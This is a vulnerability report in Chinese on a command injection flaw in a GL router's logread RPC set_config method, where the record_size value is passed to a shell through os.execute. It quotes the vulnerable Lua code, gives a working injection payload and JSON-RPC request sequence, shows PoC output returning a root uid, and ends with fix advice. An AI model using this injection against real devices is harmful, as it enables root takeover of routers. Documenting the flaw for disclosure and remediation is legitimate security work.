# 漏洞：logread.set_config record_size 参数命令注入 RCE

> 本报告对应 `exp/poc_logread_set_config_rce.py`。`logread` Lua RPC 插件的 `set_config` 方法将 `record_size` 参数直接拼接到 `insmod` 命令中，通过 `os.execute()` 执行，造成认证后 root 命令注入。**此漏洞独立于同文件中 `get_system_log` 的 `module` 参数注入**。

---

## 一、漏洞概要

| 属性 | 值 |
|------|-----|
| **状态** | Confirmed + PoC 打通（Root RCE） |
| **认证要求** | 需要 GL `/rpc` admin/root session |
| **攻击面** | `/rpc` → `logread` Lua RPC 插件 → `set_config` |
| **影响** | 认证后 root 命令执行 |
| **注入参数** | `record_size`（文档标注 number，代码中无类型强制） |
| **核心 sink** | `os.execute("insmod /lib/modules/4.14.221/mtdoops.ko record_size=" .. record_size .. " mtddev=log")` |
| **根因** | `record_size` 无类型校验，Lua 的 `..` 运算符直接拼接字符串。`os.execute()` 底层调用 `/bin/sh -c` |

---

## 二、源码级验证

`/usr/lib/oui-httpd/rpc/logread` 第217-228行：

```lua
function M.set_config(params)
    local enable = params.enable
    local record_size = params.record_size      -- ← Source: 直接取自 JSON params
    local path = params.path or "/usr/share/mylog"

    if record_size then
        c:set("gl_logread", "crash", "record_size", record_size)
        c:commit("gl_logread")
        os.execute("rmmod mtdoops")
        os.execute("insmod /lib/modules/4.14.221/mtdoops.ko record_size="
                   .. record_size .. " mtddev=log")   -- 💣 SINK
    end
    -- ...
end
```

**关键点**：
- 注释标注 `@in number ?record_size`，暗示应当是整数
- 但代码中**从未调用 `tonumber()` 进行类型转换**
- Lua 的 `..` 运算符对任何类型都会调用隐式 `tostring()` 转换
- `os.execute()` 等价于 C 的 `system()`，调用 `/bin/sh -c`

---

## 三、注入原理

```
正常:  record_size = 4096
       cmd = "insmod .../mtdoops.ko record_size=4096 mtddev=log"
       shell: insmod .../mtdoops.ko record_size=4096 mtddev=log
       ✅

攻击:  record_size = "4096; id > /tmp/poc; #"
       cmd = "insmod .../mtdoops.ko record_size=4096; id > /tmp/poc; # mtddev=log"

       shell 解析:
       ┌──────────────────────────────────────────────────────┐
       │ insmod .../mtdoops.ko record_size=4096                │ ← insmod 参数不完整/报错
       ├──────────────────────────────────────────────────────┤
       │ ;                                                     │ ← 命令分隔符
       │ id > /tmp/poc                                          │ ← 💣 RCE（root）
       ├──────────────────────────────────────────────────────┤
       │ ;                                                     │
       │ # mtddev=log                                          │ ← # 注释掉尾部
       └──────────────────────────────────────────────────────┘
```

---

## 四、完整攻击链

```text
Authenticated Attacker (知道 admin 密码)
  │
  ├─[1]─ POST /rpc challenge → 获取 salt, nonce
  ├─[2]─ POST /rpc login → 获取 sid
  │
  ├─[3]─ POST /rpc
  │      {"jsonrpc":"2.0","id":3,"method":"call",
  │       "params":["<sid>","logread","set_config",
  │                 {"record_size":"4096; id>/tmp/poc; #"}]}
  │
  │      → nginx → oui-rpc.lua → rpc.call("logread","set_config",args)
  │      → dofile("/usr/lib/oui-httpd/rpc/logread")
  │      → M.set_config({record_size="4096; id>/tmp/poc; #"})
  │
  ├─[4]─ os.execute("insmod ... record_size=4096; id>/tmp/poc; # mtddev=log")
  │      → /bin/sh -c:
  │          insmod ... record_size=4096    ← 参数不完整，报错
  │          id > /tmp/poc                  ← 💣 RCE
  │          # mtddev=log                   ← 被注释
  │
  └─[5]─ POST /download 取回 /tmp/poc 验证
```

---

## 五、PoC 验证

```
$ python3 poc_logread_set_config_rce.py https://192.168.8.1 "id > /tmp/poc_lr_set"
[+] sid=UQIIvZaWNvIoPBq6QmV6hUeG6zCLdO75
[+] result: {"id": 3, "jsonrpc": "2.0", "result": []}

$ curl ... /download path=/tmp/poc_lr_set
uid=0(root) gid=0(root) groups=0(root),65533(rpc)
```

---

## 六、与 get_system_log 的对比

| 特性 | get_system_log | set_config |
|------|---------------|------------|
| 注入参数 | `module` | `record_size` |
| Sink 类型 | `io.popen()` | `os.execute()` |
| 输出返回 | `f:read("*a")` → 直接返回 | 无（需重定向到文件） |
| 文档类型标注 | string（正确） | number（**未强制**） |
| PoC 行数 | 42行 | 34行 |

---

## 七、修复建议

| 优先级 | 措施 |
|--------|------|
| **P0** | 使用 `tonumber(record_size)` 强制类型转换，非数字则拒绝 |
| **P0** | 或校验 `record_size` 为 `^[0-9]+$`，且范围在 4096 的整数倍 |
| **P1** | 将 `os.execute()` 替换为 `ngx.pipe.spawn()` 数组形式，绕过 shell |
| **P1** | 为所有 `/rpc` 参数添加类型和格式的 server-side 校验框架 |
